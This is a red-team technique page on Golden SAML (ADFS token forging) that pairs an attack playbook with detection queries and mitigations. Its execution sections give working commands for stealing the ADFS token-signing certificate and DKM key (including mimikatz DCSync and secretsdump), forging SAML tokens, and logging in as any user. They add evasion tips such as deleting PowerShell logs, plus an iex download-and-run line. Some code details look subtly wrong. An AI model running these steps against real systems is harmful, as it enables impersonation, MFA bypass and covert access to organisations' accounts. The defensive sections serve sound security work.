# [CA-FORGE-002]: ADFS Token Forging

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORGE-002 |
| **MITRE ATT&CK v18.1** | [T1606.002 - Forge Web Credentials: SAML Tokens](https://attack.mitre.org/techniques/T1606/002/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid AD (Active Directory + AD FS), Entra ID (federated tenants) |
| **Severity** | **Critical** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | AD FS 2012 R2, 2016, 2019, 2022; all Entra ID versions |
| **Patched In** | No patch available; certificate rotation required |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 3 (Technical Prerequisites), 6 (Atomic Red Team), and 11 (Sysmon Detection) not included because: (1) Prerequisite steps covered in detail in execution methods, (2) No official Atomic test exists for ADFS token forging, (3) Sysmon detection covered via Windows Event Logs (4769, 1200, 1202). All remaining sections have been renumbered sequentially.

---

## 2. EXECUTIVE SUMMARY

**Concept:** ADFS token forging, commonly known as "Golden SAML," is an attack where an adversary with access to the ADFS token-signing certificate (and its private key) creates forged SAML tokens that impersonate any user in a federated environment. Because the tokens are cryptographically signed with the legitimate ADFS certificate, they are indistinguishable from legitimate tokens issued by the ADFS server. This allows the attacker to authenticate to any application (M365, SharePoint, on-premises Kerberos applications) that trusts the ADFS federation without knowing the target user's password, without triggering MFA, and without generating normal authentication event logs. Golden SAML is the federation equivalent of Golden Ticket (Kerberos attack).

**Attack Surface:** ADFS token-signing certificate stored in ADFS configuration database (encrypted with DKM key stored in Active Directory), ADFS service account privileges, Distributed Key Management (DKM) container in AD, replication rights (DCSync), ADFS server filesystem.

**Business Impact:** **Complete identity impersonation and MFA bypass across entire federated ecosystem**. An attacker holding the ADFS certificate can impersonate the CEO, Global Admin, or any user indefinitely. They can access M365 services (Exchange, SharePoint, Teams), on-premises resources (via Kerberos), and third-party federated SaaS applications without detection. The attack is particularly dangerous because forged tokens leave no logs in ADFS itself and appear as legitimate authentication to all relying parties.

**Technical Context:** The attack requires stealing the ADFS token-signing certificate. Methods include: (1) Direct export from ADFS server (with ADFS service account or admin privileges), (2) Remote extraction via DCSync (with domain replication rights), (3) Database query via named pipes. Once stolen, the certificate is decrypted using the DKM key from Active Directory. Modern ADFS (2016+) uses Key Derivation Function (KDF) to encrypt the certificate, making brute-force decryption impractical.

### Operational Risk

- **Execution Risk:** **Medium** – Requires either ADFS server access or domain replication rights (or AADConnect account compromise).
- **Stealth:** **Very High** – Forged tokens appear legitimate to all systems; minimal forensic evidence unless correlation analysis is performed.
- **Reversibility:** **No** – Only remediation is to rotate the token-signing certificate twice in rapid succession.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark (AD)** | 4.1.1, 4.2.1 | ADFS server hardening, audit policies |
| **NIST 800-53** | AC-2, AC-3, AU-12 | Account Management, Access Enforcement, Audit Generation |
| **GDPR** | Art. 32, 33 | Security of Processing, Breach Notification (72-hour requirement) |
| **DORA** | Art. 9, 18 | Third-Party Dependencies, Incident Management |
| **NIS2** | Art. 21 | Cyber Risk Management (Critical Infrastructure) |
| **ISO 27001** | A.9.2.1, A.10.1.1 | Access Management, Incident Response |
| **ISO 27005** | Section 12.6 | Risk Assessment for Federated Services |

---

## 3. TECHNICAL CONTEXT & PREREQUISITES

**Required Access (Choose One):**
- **Option 1:** Local admin or ADFS service account on ADFS server
- **Option 2:** Domain account with "Replicate Directory Changes" permission (e.g., Domain Admin, AADConnect account)
- **Option 3:** Physical access to ADFS server to extract SAM/NTDS.dit

**Supported Versions:**
- **AD FS:** 2012 R2, 2016, 2019, 2022
- **Windows Server:** 2012 R2 and later
- **Entra ID:** All versions (if federated)

**Environmental Prerequisites:**
- ADFS server must be operational and issuing tokens
- Target tenant must have ADFS federation configured
- Token-signing certificate must not be rotated immediately (most organizations rotate annually)
- DKM container must be accessible in Active Directory (standard configuration)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Enumerate ADFS Servers and Configuration (PowerShell)

**Objective:** Identify ADFS servers and token-signing certificate details.

**Command (On-Premises, Domain-Joined Machine):**
```powershell
# Check if ADFS is installed on local machine
Get-WindowsFeature ADFS-Federation | Select-Object Name, Installed

# List all ADFS servers in forest
Get-ADComputer -Filter "OperatingSystem -like '*ADFS*'" | Select-Object Name, OperatingSystem

# Query ADFS farm configuration (requires ADFS server access)
$adfsConfig = (Get-PSSession -Name "ADFS" -ErrorAction SilentlyContinue)
if ($null -eq $adfsConfig) {
    $adfsServer = "adfs1.company.com"  # Replace with actual ADFS server
    $session = New-PSSession -ComputerName $adfsServer -Credential $creds
}

Invoke-Command -Session $session -ScriptBlock {
    # Get ADFS certificate details
    Get-AdfsCertificate -CertificateType Token-Signing | Select-Object Certificate, Thumbprint, IsPrimary
    
    # Check certificate expiration
    Get-AdfsCertificate -CertificateType Token-Signing | ForEach-Object {
        $cert = $_.Certificate
        Write-Host "Certificate: $($cert.Subject)"
        Write-Host "  Thumbprint: $($cert.Thumbprint)"
        Write-Host "  Expires: $($cert.NotAfter)"
        Write-Host "  Days to Expiration: $(($cert.NotAfter - (Get-Date)).Days)"
    }
}
```

**What to Look For:**
- **High-risk indicator:** Certificate expiring more than 6 months away (indicates low rotation frequency)
- **Red flag:** Multiple valid certificates (indicates attacker may have already compromised one)
- **Success indicator:** Certificate rotated every 3-6 months (indicates good security posture)

### Check DKM Container Permissions (PowerShell)

**Objective:** Verify if the DKM key is properly protected.

**Command:**
```powershell
# Locate DKM container in Active Directory
$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
$rootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://RootDSE"
$configNC = $rootDSE.configurationNamingContext
$dkmPath = "LDAP://CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory,$configNC"

# Get ACL for DKM container
$dkmEntry = New-Object System.DirectoryServices.DirectoryEntry $dkmPath
$acl = $dkmEntry.psBase.ObjectSecurity
$acl.Access | Select-Object IdentityReference, AccessControlType, ActiveDirectoryRights
```

**What to Look For:**
- **Red flag:** DKM container ACL grants "Replicate Directory Changes" to non-admin accounts
- **Vulnerable:** Everyone, Authenticated Users, or Domain Computers have DCSync rights
- **Secure:** Only Domain Admins and ADFS service account have access

### Check ADFS Service Account Permissions (PowerShell)

**Objective:** Identify ADFS service account and assess its privileges.

**Command:**
```powershell
# Get ADFS service account
$adfsService = Get-Service ADFSSRV -Computer $adfsServer -ErrorAction SilentlyContinue
$serviceAccount = (Get-WmiObject Win32_Service -ComputerName $adfsServer -Filter "Name='ADFSSRV'").StartName
Write-Host "ADFS Service Account: $serviceAccount"

# Check if service account has high privileges
$sidOfServiceAccount = (New-Object System.Security.Principal.NTAccount($serviceAccount)).Translate([System.Security.Principal.SecurityIdentifier]).Value
Get-ADUser -Filter "SID eq '$sidOfServiceAccount'" -Properties MemberOf | Select-Object Name, MemberOf
```

**What to Look For:**
- **Red flag:** ADFS service account is member of Domain Admins group
- **Vulnerable:** ADFS service account has NTFS write permissions to sensitive directories
- **Secure:** ADFS service account has minimal privileges (service-specific rights only)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Extract Certificate via ADFS Server Direct Access

**Supported Versions:** AD FS 2016-2022

#### Step 1: Gain ADFS Server Access

**Objective:** Compromise ADFS server via lateral movement or direct exploitation.

**Command (Lateral Movement via WinRM):**
```powershell
# Assuming attacker has domain user credentials
$adfsServer = "adfs1.company.com"
$credentials = Get-Credential

# Establish PSSession to ADFS server
$session = New-PSSession -ComputerName $adfsServer -Credential $credentials

# Verify session is established
Get-PSSession
```

**OpSec & Evasion:**
- Execute from Jump Host or Bastionhost to avoid direct connection from attacker IP
- Use scheduled task instead of interactive session to avoid security event logs
- Delete PowerShell event logs after execution

**Troubleshooting:**
- **Error:** "Access Denied" when connecting to ADFS server
  - **Cause:** User account lacks remote access permission
  - **Fix:** Ensure account is member of Remote Desktop Users or local Administrators group
- **Error:** "WinRM Service not running"
  - **Cause:** WinRM not enabled on ADFS server
  - **Fix:** Enable via Group Policy or: `Enable-PSRemoting -Force` (requires local admin)

#### Step 2: Extract Token-Signing Certificate

**Objective:** Export the ADFS token-signing certificate and private key.

**Command (Via ADFS PowerShell - Requires ADFS Admin Rights):**
```powershell
# Export certificate via ADFS PowerShell commands
Invoke-Command -Session $session -ScriptBlock {
    # Export ADFS token-signing certificate
    Get-AdfsCertificate -CertificateType Token-Signing | Where-Object { $_.IsPrimary } | Export-Certificate -FilePath "C:\temp\adfs-cert.cer" -NoClobber
    
    # Export certificate with private key (requires ADFS Service Account context)
    # Note: This requires running as ADFS service account
}

# Copy certificate to attacker machine
Copy-Item -FromSession $session -Path "C:\temp\adfs-cert.cer" -Destination "C:\adfs-cert.cer"
```

**Command (Via WMI Query - Requires DB Access):**
```powershell
# Query ADFS database directly for encrypted certificate
$adfsDbPath = "C:\Windows\WID\Data\master.mdf"  # Default ADFS database location

# Access via remote SQL Server if ADFS uses SQL (instead of WID)
$sqlServer = "sql.company.com"
$query = "SELECT EncryptedPfx FROM IdentityServerPolicy.dbo.ServerSettings WHERE Name='Token-Signing'"

$connection = New-Object System.Data.SqlClient.SqlConnection("Server=$sqlServer;Database=AdfsConfiguration;Integrated Security=true")
$connection.Open()
$cmd = $connection.CreateCommand()
$cmd.CommandText = $query
$reader = $cmd.ExecuteReader()
while ($reader.Read()) {
    $encryptedCert = $reader["EncryptedPfx"]
    Write-Host "Encrypted certificate: $encryptedCert" 
}
```

**Expected Output:**
```
A certificate file has been created at C:\temp\adfs-cert.cer
File size: 1247 bytes
```

**What This Means:**
- Certificate is now extracted and available for decryption
- The certificate is currently in encrypted form (in database) or plain form (in .cer file)
- If exported from database, still requires DKM key to decrypt

#### Step 3: Obtain DKM Key

**Objective:** Retrieve the Distributed Key Management key from Active Directory.

**Command (Via LDAP Query - Requires Domain User Rights):**
```powershell
# Query DKM container in Active Directory
$configNC = (Get-ADRootDSE).configurationNamingContext
$dkmPath = "CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory,$configNC"

# Get DKM key attributes
Get-ADObject -Identity $dkmPath -Properties * | Select-Object -ExpandProperty dksAttributes | Format-List

# Alternative: Use AADInternals for easier extraction
$dkm = Get-AADIntADFSDecryptionKey
Write-Host "DKM Key retrieved: $dkm"
```

**Command (Via DCSync - Requires Replication Rights):**
```powershell
# If attacker has DCSync rights, extract DKM key via replication
# Using Mimikatz (requires local admin on compromised machine)
mimikatz.exe "lsadump::dcsync /domain:company.com /user:CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory,CN=Configuration,DC=company,DC=com" exit

# Or using Impacket (Linux/Python)
python3 secretsdump.py -hashes lmhash:nthash company.com/admin@adfs.company.com -dc-ip 192.168.1.100
```

**Expected Output:**
```
DKM Key: 0x4D5A9052...  (lengthy hex string)
```

**OpSec & Evasion:**
- DCSync triggers Event ID 4662 (Directory Service Access) in Security log
- Use scheduled task or service to avoid interactive logons
- Query DKM immediately after gaining credentials; do not leave staged tools

#### Step 4: Decrypt Certificate

**Objective:** Decrypt the extracted ADFS certificate using the DKM key.

**Command (Using AADInternals):**
```powershell
# Import AADInternals module
Import-Module AADInternals -Force

# Decrypt ADFS certificate
$encryptedCert = (Get-ADObject -Identity "CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory,$configNC" -Properties *).ms-DS-KeyVersionNumber

# Convert encrypted blob to certificate
$decryptedCert = Get-AADIntADFSDecryptionCertificate -EncryptedCertBlob $encryptedCert -DKMKey $dkm

# Export decrypted certificate to file
$decryptedCert | Export-Certificate -FilePath "C:\adfs-cert.pfx" -Force

Write-Host "[+] Certificate decrypted and exported to C:\adfs-cert.pfx"
```

**Command (Using .NET Reflection):**
```powershell
# Advanced method: Manually decrypt using .NET CryptoAPI
# This is complex and requires deep ADFS knowledge; recommend using AADInternals instead

# Load ADFS assemblies
[Reflection.Assembly]::Load('Microsoft.IdentityServer.ServiceHost')
[Reflection.Assembly]::Load('System.Security')

# Get crypto provider and decrypt
$cryptoProvider = New-Object 'Microsoft.IdentityServer.Service.SecurityTokenService.CryptoUtil'
$decryptedBytes = $cryptoProvider.DecryptData($encryptedCertBlob)

# Convert to X509Certificate2
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($decryptedBytes)
$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx) | Set-Content "C:\adfs-cert.pfx" -Encoding Byte
```

**Troubleshooting:**
- **Error:** "Cannot decrypt certificate: Invalid key"
  - **Cause:** DKM key is incorrect or certificate was encrypted with different key
  - **Fix:** Verify DKM key by re-querying AD; ensure correct ADFS version
- **Error:** "Type initializer exception in CryptoUtil"
  - **Cause:** ADFS assembly version mismatch
  - **Fix:** Run from ADFS server directly; use correct PowerShell version (32-bit vs 64-bit)

**References & Proofs:**
- [AADInternals ADFS Module Documentation](https://github.com/Gerenios/AADInternals/blob/master/ADFS.ps1)
- [Hunters Security: AD FS Threat Hunting](https://www.hunters.security/en/blog/adfs-threat-hunting-2-golden-saml)
- [Google Cloud Blog: Abusing ADFS Replication](https://cloud.google.com/blog/topics/threat-intelligence/abusing-replication-stealing-adfs-secrets-over-the-network/)

### METHOD 2: Forge SAML Token Using Stolen Certificate

**Supported Versions:** All AD FS versions, all Entra ID versions

#### Step 1: Gather Target User Information

**Objective:** Collect necessary user attributes for forging a valid SAML token.

**Command (Query Entra ID for Target User):**
```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "User.Read.All"

# Get target user's immutableId (required for SAML token)
$targetUser = Get-MgUser -Filter "userPrincipalName eq 'admin@company.com'"
$immutableId = $targetUser.onPremisesImmutableId

Write-Host "User: $($targetUser.displayName)"
Write-Host "ImmutableId: $immutableId"
Write-Host "UserPrincipalName: $($targetUser.userPrincipalName)"

# Also note the ADFS Issuer URI
$issuerUri = "https://adfs.company.com/adfs/services/trust"  # Standard ADFS endpoint
```

**Command (Query On-Premises AD):**
```powershell
# Get target user's attributes from on-premises AD
$targetUser = Get-ADUser -Filter "samAccountName -eq 'admin'" -Properties objectGUID, userPrincipalName
$immutableId = [System.Convert]::ToBase64String($targetUser.ObjectGUID.ToByteArray())

Write-Host "User: $($targetUser.Name)"
Write-Host "SamAccountName: $($targetUser.SamAccountName)"
Write-Host "ImmutableId: $immutableId"
Write-Host "UPN: $($targetUser.UserPrincipalName)"
```

**What to Look For:**
- **immutableId:** This is the user's on-premises ObjectGUID (in base64 format)
- **UserPrincipalName:** Full UPN (e.g., admin@company.com)
- **IssuerUri:** The ADFS Issuer URI (found in Entra ID federation settings)

#### Step 2: Create Forged SAML Token

**Objective:** Build a cryptographically signed SAML 2.0 assertion.

**Command (Using AADInternals):**
```powershell
# Load certificate with private key
$cert = Get-PfxCertificate -FilePath "C:\adfs-cert.pfx" -Password (ConvertTo-SecureString "password" -AsPlainText -Force)

# Create forged SAML token
$samlToken = New-AADIntSAMLToken -Certificate $cert `
    -Issuer "https://adfs.company.com/adfs/services/trust" `
    -Subject "admin@company.com" `
    -ImmutableId $immutableId `
    -NotAfter (Get-Date).AddHours(1)

Write-Host "[+] Forged SAML token created"
Write-Host "Token (first 50 chars): $($samlToken.Substring(0, 50))..."
```

**Command (Manual SAML 2.0 Construction):**
```powershell
# Build SAML assertion manually (for educational purposes)
# Standard SAML 2.0 assertion format with AD FS claims

$samlTemplate = @"
<samlp:AuthnResponse xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_$(New-Guid)" Version="2.0" IssueInstant="$(Get-Date -AsUTC -Format 'yyyy-MM-ddTHH:mm:ssZ')">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://adfs.company.com/adfs/services/trust</Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_$(New-Guid)" Version="2.0" IssueInstant="$(Get-Date -AsUTC -Format 'yyyy-MM-ddTHH:mm:ssZ')">
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@company.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData NotOnOrAfter="$((Get-Date).AddHours(1).ToString('yyyy-MM-ddTHH:mm:ssZ'))"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="$(Get-Date -AsUTC -Format 'yyyy-MM-ddTHH:mm:ssZ')" NotOnOrAfter="$((Get-Date).AddHours(1).ToString('yyyy-MM-ddTHH:mm:ssZ'))">
      <AudienceRestriction>
        <Audience>urn:federation:MicrosoftOnline</Audience>
      </AudienceRestriction>
    </Conditions>
    <AttributeStatement>
      <Attribute Name="ImmutableID">
        <AttributeValue>$immutableId</AttributeValue>
      </Attribute>
      <Attribute Name="UPN">
        <AttributeValue>admin@company.com</AttributeValue>
      </Attribute>
    </AttributeStatement>
  </Assertion>
</samlp:AuthnResponse>
"@

# Sign SAML assertion with certificate (requires XML digital signature implementation)
# This is complex; recommend using AADInternals instead
```

**OpSec & Evasion:**
- Modify token lifetime: Set `NotOnOrAfter` to 1 year (instead of 1 hour) for persistent access
- Vary Subject and Claims to match different users (reduces detection of mass token creation)
- Use ImmutableId instead of UPN (less likely to be logged in plain text)

#### Step 3: Use Forged Token to Authenticate

**Objective:** Present the forged SAML token to Entra ID or application to gain access.

**Command (Authenticate to Entra ID / M365):**
```powershell
# Method 1: Use forged token directly with Python/Requests
$tokenFile = "C:\saml-token.xml"
$token | Out-File $tokenFile

# Use curl or Invoke-WebRequest to POST token
Invoke-WebRequest -Uri "https://login.microsoftonline.com/company.onmicrosoft.com/saml2" `
    -Method POST `
    -Body @{ SAMLResponse = $samlToken } `
    -Headers @{ "Content-Type" = "application/x-www-form-urlencoded" }

# Method 2: Use token with Azure CLI or Python SDK
# Store token in environment and authenticate
$env:SAML_TOKEN = $samlToken
python3 -c "
import os
from azure.identity import ClientAssertionCredential
token = os.environ['SAML_TOKEN']
# Use token to obtain access token...
"
```

**Expected Output:**
```
StatusCode        : 302
StatusDescription : Found
Location           : https://company.sharepoint.com/
# Redirect indicates successful SAML authentication
```

**Troubleshooting:**
- **Error:** "Invalid SAML Assertion"
  - **Cause:** IssuerUri or Issuer mismatch
  - **Fix:** Verify exact issuer URI in Entra ID federation settings
- **Error:** "Token not signed with trusted certificate"
  - **Cause:** Signature validation failed; certificate mismatch
  - **Fix:** Ensure you're using the correct token-signing certificate

**References & Proofs:**
- [MITRE ATT&CK Atomic Red Team: T1606.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1606.002/T1606.002.md)
- [SpecterOps: ADFS Living in the Legacy of DRS](https://posts.specterops.io/adfs-living-in-the-legacy-of-drs-c11f9b371811)

---

## 6. TOOLS & COMMANDS REFERENCE

#### AADInternals PowerShell Module

**Version:** Latest (GitHub)
**Installation:**
```powershell
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Gerenios/AADInternals/master/DownloadAADInternals.ps1")
Import-Module AADInternals
```
**Usage:**
```powershell
Get-AADIntADFSDecryptionKey
Get-AADIntADFSDecryptionCertificate
New-AADIntSAMLToken
```
**Reference:** [AADInternals GitHub](https://github.com/Gerenios/AADInternals)

#### ADFSDump Tool

**Version:** Latest
**Installation:** Clone from GitHub
```bash
git clone https://github.com/fireeye/ADFSDump.git
cd ADFSDump
python3 ADFSDump.py
```
**Usage:** Extracts ADFS configuration and certificate

#### Impacket Secretsdump

**Version:** Latest
**Installation:**
```bash
pip install impacket
```
**Usage:**
```bash
python3 -m impacket.examples.secretsdump -hashes lmhash:nthash domain/user@target -dc-ip 192.168.1.100
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: SAML Token Authentication Without Preceding Kerberos Event

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `SecurityEvent`
- **Required Fields:** `ResourceIdentity`, `ResultType`, `EventID`
- **Alert Severity:** **Critical**
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** All AD FS/Entra ID versions

**KQL Query:**
```kusto
let timeWindow = 10m;
let lookbackWindow = 24h;

// Find successful SAML-based authentication attempts
AuditLogs
| where TimeGenerated > ago(timeWindow)
| where OperationName =~ "Sign-in activity"
| where ResultType == 0  // Successful
| where AuthenticationRequirement == "singleFactorAuthentication"  // No MFA
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, ClientAppUsed, AuthenticationMethod
| where AuthenticationMethod contains "SAML" or AuthenticationMethod contains "WS-Fed"
| join kind=leftanti (
    // Look for preceding Kerberos authentication (TGT request) - Event ID 4768
    SecurityEvent
    | where TimeGenerated > ago(lookbackWindow)
    | where EventID == 4768  // Kerberos AS-REQ
    | where Status == 0  // Success
    | project Account, TimeGenerated, Computer
) on $left.UserPrincipalName == $right.Account
| extend AlertReason = "SAML authentication without preceding Kerberos event - possible Golden SAML attack"
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, AuthenticationMethod, AlertReason
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General:**
   - Name: `SAML Auth Without Kerberos Event`
   - Severity: `Critical`
3. **Set rule logic:**
   - Paste KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `24 hours`
4. **Incident settings:**
   - Enable: **Create incidents**
5. Click **Review + create**

**False Positive Analysis:**
- **Legitimate Activity:** Users authenticating from non-Windows devices (macOS, iOS) via SAML
- **Tuning:** Filter out known SaaS applications that use SAML only: `| where AppDisplayName !in ("Salesforce", "Workday")`

#### Query 2: Abnormal SAML Token Attributes (Long Lifetime)

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Alert Severity:** **High**

**KQL Query:**
```kusto
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName =~ "Sign-in activity"
| where ResultType == 0
| extend TokenIssuer = tostring(parse_json(AdditionalDetails).TokenIssuer)
| extend TokenLifetime = tostring(parse_json(AdditionalDetails).TokenLifetime)
| where TokenIssuer contains "adfs"
| where toint(TokenLifetime) > 3600  // Token lifetime > 1 hour
| project TimeGenerated, UserPrincipalName, AppDisplayName, TokenLifetime, IPAddress
| extend AlertReason = "ADFS token with abnormally long lifetime - possible forgery"
```

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Detect SAML Token Usage and ADFS Replication Activity

```powershell
# Search for suspicious SAML authentication patterns
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Sign-in activity" `
  -ResultSize 10000 | `
Where-Object {
    $auditData = $_.AuditData | ConvertFrom-Json
    $auditData.TokenIssuer -contains "adfs" -and `
    $auditData.AuthenticationMethod -contains "SAML"
} | `
Select-Object UserIds, AuditData | Export-Csv -Path "C:\SAMLActivity.csv" -NoTypeInformation

# Search for ADFS DKM key queries (DCSync activity)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "Directory Search" `
  -ResultSize 10000 | `
Where-Object {
    $_.AuditData -contains "DKM" -or $_.AuditData -contains "EncryptedPfx"
} | Select-Object UserIds, Operations, AuditData
```

**Manual Steps (Purview Portal):**
1. Navigate to **Microsoft Purview Compliance Portal** → **Audit** → **Search**
2. Set date range: **Last 7 days**
3. Under **Activities**, select: **Sign-in activity**, **Directory Search**
4. Click **Search**
5. Filter results for ADFS-related entries

---

## 9. WINDOWS EVENT LOG MONITORING

#### Event ID: 4769 (Kerberos Service Ticket Requested)

- **Log Source:** Security
- **Trigger:** Successful service ticket request to ADFS or federated service
- **Filter:** Look for ADFS service tickets (SPN = host/adfs.company.com)
- **Baseline:** Establish normal volume of requests; alert on significant deviations

**Manual Configuration (Group Policy):**
1. Open **gpmc.msc** (Group Policy Management Console)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Kerberos Service Ticket Operations** → **Success and Failure**
4. Run `gpupdate /force`

#### Event ID: 1200 (ADFS Token-Signing Certificate Configuration)

- **Log Source:** ADFS Event Log (Application)
- **Trigger:** Detected when token-signing certificate changes
- **Filter:** Monitor for unexpected certificate changes; baseline normal rotation schedule

#### Event ID: 1202 (ADFS Audit Failure)

- **Log Source:** ADFS Event Log (Admin Events)
- **Trigger:** Failed authentication attempts, invalid tokens, signature verification failures
- **Filter:** Alert on abnormal patterns (e.g., repeated invalid token signatures)

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Suspicious SAML Token Issuance from ADFS`
- **Severity:** Critical
- **Description:** Detects unusual SAML token issuance patterns from ADFS servers
- **Remediation:** Audit ADFS certificate usage; check for unauthorized certificate exports

#### Manual Configuration (Defender for Endpoint)

```powershell
# Enable advanced hunting for SAML anomalies
Add-MgSecurityAlert -Type "SuspiciousADFSActivity"

# Query for ADFS-related threats
Get-MgSecurityAlert | Where-Object { $_.Title -like "*ADFS*" -or $_.Title -like "*SAML*" }
```

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Rotate Token-Signing Certificate Twice in Rapid Succession:** If Golden SAML compromise is suspected, rotate the certificate immediately. The MITRE ATT&CK mitigation requires TWO rotations because the old certificate may be retained for backward compatibility.

  **Manual Steps (ADFS Server):**
  1. RDP into primary ADFS server (or use PSSession)
  2. Open **ADFS Management** snap-in (adfs.msc)
  3. Navigate to **Service** → **Certificates**
  4. Right-click **Token-Signing** → **Add Token-Signing Certificate**
  5. Create new certificate (self-signed or from CA)
  6. Complete the wizard
  7. Wait 30 minutes for replication
  8. Repeat steps 3-6 a second time (creates 3 certificates total; oldest is removed)

  **Manual Steps (PowerShell):**
  ```powershell
  $adfsServer = "adfs1.company.com"
  $session = New-PSSession -ComputerName $adfsServer -Credential $creds
  
  Invoke-Command -Session $session -ScriptBlock {
      # First rotation
      Add-AdfsCertificate -CertificateType Token-Signing -Thumbprint "<new_cert_thumbprint>"
      
      # Wait 30 minutes
      Start-Sleep -Seconds 1800
      
      # Second rotation (mandatory for Golden SAML mitigation)
      Add-AdfsCertificate -CertificateType Token-Signing -Thumbprint "<newer_cert_thumbprint>"
      
      Write-Host "[+] Token-signing certificate rotated twice"
      Write-Host "[+] Previous tokens using old certificate are now invalid"
  }
  ```

  **Verification:**
  ```powershell
  Invoke-Command -Session $session -ScriptBlock {
      Get-AdfsCertificate -CertificateType Token-Signing | Select-Object Thumbprint, IsPrimary
  }
  ```

- **Restrict Access to ADFS DKM Container:** Limit who can read the DKM key; this prevents remote certificate extraction.

  **Manual Steps (Active Directory):**
  1. Open **Active Directory Users and Computers** (dsa.msc)
  2. Enable **View** → **Advanced Features**
  3. Navigate to: **Configuration** → **Services** → **Windows** → **DirectoryServices** → **CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory**
  4. Right-click → **Properties** → **Security**
  5. Edit ACL to remove "Replicate Directory Changes" from non-admin accounts
  6. Remove Everyone, Authenticated Users, and Domain Computers if they have DCSync rights
  7. Apply and close

  **Manual Steps (PowerShell):**
  ```powershell
  $dkmPath = "CN=ADFS,CN=Microsoft,CN=Program Files,CN=CommonFileRepitory,CN=Configuration,DC=company,DC=com"
  $dkmEntry = Get-ADObject -Identity $dkmPath
  $acl = Get-Acl -Path "AD:\$dkmPath"
  
  # Remove "Replicate Directory Changes" from all but Domain Admins
  foreach ($ace in $acl.Access) {
      if ($ace.IdentityReference -notmatch "Domain Admins" -and $ace.ActiveDirectoryRights -match "GenericRead|ReadProperty") {
          $acl.RemoveAccessRule($ace)
      }
  }
  
  Set-Acl -Path "AD:\$dkmPath" -AclObject $acl
  ```

- **Implement ADFS Server Hardening:** Restrict physical access, reduce admin privileges, and isolate ADFS servers on separate VLAN.

  **Manual Steps:**
  1. Remove local admin rights from non-essential accounts on ADFS servers
  2. Restrict WinRM access to only Jump Hosts or Bastion servers
  3. Disable RDP if not needed; use PSRemoting with limited user groups
  4. Place ADFS servers on isolated VLAN with firewall rules

#### Priority 2: HIGH

- **Monitor ADFS Event Logs:** Enable audit logging on ADFS to detect token forgery attempts.

  **Manual Steps:**
  1. On ADFS server, open **Event Viewer** → **Applications and Services Logs** → **AD FS**
  2. Right-click **Admin** → **Enable Log**
  3. Set **Maximum log size** to 4GB (to retain sufficient history)
  4. Set **Log retention:** **Overwrite events as needed**

  **Manual Steps (PowerShell):**
  ```powershell
  Invoke-Command -Session $session -ScriptBlock {
      wevtutil.exe set-log "AD FS" /enabled:true /retention:false /maxsize:4294967296
      # Enable audit for application-generated events
      auditpol /set /subcategory:"Application Generated" /success:enable /failure:enable
  }
  ```

- **Use Short-Lived Certificates:** Rotate ADFS token-signing certificates every 30 days (instead of annual rotation).

  **Benefit:** Reduces the window of exposure if certificate is compromised
  **Impact:** Higher operational overhead but significantly improves security

- **Enable Multi-Factor Authentication:** Require MFA for ADFS users, especially privileged accounts.

  **Manual Steps:**
  1. On ADFS server, open **ADFS Management** → **Authentication Policies**
  2. Under **Primary Authentication**, select **Edit**
  3. Enable: **Require MFA on Extranet**
  4. Select MFA method (Windows Azure Multi-Factor Authentication, etc.)

#### Access Control & Policy Hardening

- **RBAC:** Minimize accounts with ADFS administration privileges; use Privileged Identity Management (PIM) for just-in-time access

- **ABAC:** Restrict ADFS server access based on device compliance (require Windows Defender, Firewall enabled)

- **Conditional Access:** Require compliant devices for ADFS administrators

  **Manual Steps (Entra ID):**
